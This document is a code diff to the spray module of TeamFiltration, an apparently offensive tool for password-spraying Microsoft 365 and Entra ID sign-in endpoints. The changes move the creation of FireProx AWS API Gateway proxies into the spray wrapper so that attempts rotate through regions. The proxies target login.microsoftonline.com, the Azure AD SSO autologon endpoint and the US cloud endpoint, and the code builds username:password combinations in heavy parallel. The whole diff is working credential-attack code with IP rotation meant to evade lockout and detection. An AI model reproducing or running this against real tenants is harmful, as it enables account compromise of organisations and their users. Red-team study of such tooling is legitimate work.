@@ -214,18 +214,35 @@ namespace TeamFiltration.Modules
 
 
         }
-        private static async Task SprayAttemptWrap(List<SprayAttempt> sprayAttempts, GlobalArgumentsHandler teamFiltrationConfig, DatabaseHandler _databaseHandler, UserRealmResp userRealmResp, int delayInSeconds = 0)
+        private static async Task SprayAttemptWrap(
+            List<SprayAttempt> sprayAttempts,
+            GlobalArgumentsHandler teamFiltrationConfig, 
+            DatabaseHandler _databaseHandler, 
+            UserRealmResp userRealmResp,
+            int delayInSeconds = 0,
+            int regionCounter = 0)
         {
 
             var _mainMSOLHandler = new MSOLHandler(teamFiltrationConfig, "SPRAY");
             var _checkMSOLHandler = new MSOLHandler(teamFiltrationConfig, "SPRAY");
 
+            (Amazon.APIGateway.Model.CreateDeploymentRequest, Models.AWS.FireProxEndpoint, string fireProxUrl) fireProxObject =
+                   teamFiltrationConfig.GetFireProxURLObject("https://login.microsoftonline.com", regionCounter);
+
+            if (teamFiltrationConfig.AADSSO)
+                fireProxObject = teamFiltrationConfig.GetFireProxURLObject("https://autologon.microsoftazuread-sso.com", regionCounter);
+
+            if (teamFiltrationConfig.UsCloud)
+                fireProxObject = teamFiltrationConfig.GetFireProxURLObject("https://login.microsoftonline.us", regionCounter);
 
             await sprayAttempts.ParallelForEachAsync(
                   async sprayAttempt =>
                           {
                               try
                               {
+                                  sprayAttempt.FireProxURL = fireProxObject.fireProxUrl + "/common/oauth2/token/";
+                                  sprayAttempt.FireProxRegion = fireProxObject.Item2.Region;
+
                                   var loginResp = await _mainMSOLHandler.LoginSprayAttempt(sprayAttempt, userRealmResp);
 
                                   if (!string.IsNullOrWhiteSpace(loginResp.bearerToken?.access_token))
@@ -283,14 +300,15 @@ namespace TeamFiltration.Modules
                             maxDegreeOfParallelism: 3);
 
 
-
+            await teamFiltrationConfig._awsHandler.DeleteFireProxEndpoint(fireProxObject.Item1.RestApiId, fireProxObject.Item2.Region);
 
         }
         public static async Task SprayAsync(string[] args)
         {
             var alertMsg = true;
             var forceBool = args.Contains("--force");
-            var aadSSO = args.Contains("--aad-sso");
+           
+        
 
             int sleepInMinutesMax = 100;
             int sleepInMinutesMin = 60;
@@ -311,7 +329,7 @@ namespace TeamFiltration.Modules
             var databaseHandle = new DatabaseHandler(args);
 
             var _globalProperties = new Handlers.GlobalArgumentsHandler(args, databaseHandle);
-
+          
 
             //Calcuate time format for spraying to happen
             if (args.Contains("--time-window"))
@@ -394,7 +412,7 @@ namespace TeamFiltration.Modules
 
 
             //Check if this client has ADFS
-            if (getUserRealmResult.Adfs && !aadSSO)
+            if (getUserRealmResult.Adfs && !_globalProperties.AADSSO)
             {
                 databaseHandle.WriteLog(new Log("SPRAY", $"ADFS detected, TeamFiltration ADFS support in early beta, be carefull :) "));
 
@@ -423,7 +441,7 @@ namespace TeamFiltration.Modules
                     (Amazon.APIGateway.Model.CreateDeploymentRequest, Models.AWS.FireProxEndpoint, string fireProxUrl) fireProxObject =
                         _globalProperties.GetFireProxURLObject("https://login.microsoftonline.com", regionCounter);
 
-                    if (aadSSO)
+                    if (_globalProperties.AADSSO)
                         fireProxObject = _globalProperties.GetFireProxURLObject("https://autologon.microsoftazuread-sso.com", regionCounter);
 
                     if (_globalProperties.UsCloud)
@@ -439,11 +457,11 @@ namespace TeamFiltration.Modules
 
                             Username = userCombo.Split(":")[0],
                             Password = userCombo.Split(":")[1],
-                            FireProxURL = fireProxObject.fireProxUrl + "/common/oauth2/token/",
+                            FireProxURL = fireProxObject.fireProxUrl + "/common/oauth2/token/" ,
                             FireProxRegion = fireProxObject.Item2.Region,
                             ResourceClientId = randomResource.clientId,
                             ResourceUri = randomResource.Uri,
-                            AADSSO = aadSSO,
+                            AADSSO = _globalProperties.AADSSO,
                             ADFS = getUserRealmResult.Adfs
                         };
 
@@ -457,12 +475,12 @@ namespace TeamFiltration.Modules
                         else
                             nonSprayed.Add(userCombo);
 
-                   
+
                     }
 
                     File.WriteAllLines(comboListPath.Replace(".txt", "_extra.txt"), nonSprayed);
 
-                    
+
                     await _globalProperties._awsHandler.DeleteFireProxEndpoint(fireProxObject.Item1.RestApiId, fireProxObject.Item2.Region);
 
                 }
@@ -500,14 +518,7 @@ namespace TeamFiltration.Modules
                     }
 
 
-                    (Amazon.APIGateway.Model.CreateDeploymentRequest, Models.AWS.FireProxEndpoint, string fireProxUrl) fireProxObject =
-                      _globalProperties.GetFireProxURLObject("https://login.microsoftonline.com", regionCounter);
-
-                    if (aadSSO)
-                        fireProxObject = _globalProperties.GetFireProxURLObject("https://autologon.microsoftazuread-sso.com", regionCounter);
-
-                    if (_globalProperties.UsCloud)
-                        fireProxObject = _globalProperties.GetFireProxURLObject("https://login.microsoftonline.us", regionCounter);
+                 
 
                     //Generate those combinations super fast!
                     await bufferuserNameList.ParallelForEachAsync(
@@ -529,20 +540,16 @@ namespace TeamFiltration.Modules
                                 Username = userName,
                                 Password = password,
                                 ComboHash = bufferHash,
-                                FireProxURL = fireProxObject.fireProxUrl + "/common/oauth2/token/",
-                                FireProxRegion = fireProxObject.Item2.Region,
+                                //FireProxURL = fireProxObject.fireProxUrl + "/common/oauth2/token/",
+                                //FireProxRegion = fireProxObject.Item2.Region,
                                 ResourceClientId = randomResource.clientId,
                                 ResourceUri = randomResource.Uri,
-                                AADSSO = aadSSO,
+                                AADSSO = _globalProperties.AADSSO,
                                 ADFS = getUserRealmResult.Adfs
                             });
                         }
                     },
                       maxDegreeOfParallelism: 500);
-
-
-                    
-                    await _globalProperties._awsHandler.DeleteFireProxEndpoint(fireProxObject.Item1.RestApiId, fireProxObject.Item2.Region);
 
 
                     if (_globalProperties.AWSRegions.Length - 1 == regionCounter)
@@ -611,7 +618,11 @@ namespace TeamFiltration.Modules
                                 prompted = true;
                             }
                         }
-                        await SprayAttemptWrap(listOfSprayAttempts, _globalProperties, databaseHandle, getUserRealmResult, delayInSeconds);
+                        await SprayAttemptWrap(listOfSprayAttempts, _globalProperties, databaseHandle, getUserRealmResult, delayInSeconds, regionCounter);
+
+               
+
+
                     }
                 }
             }
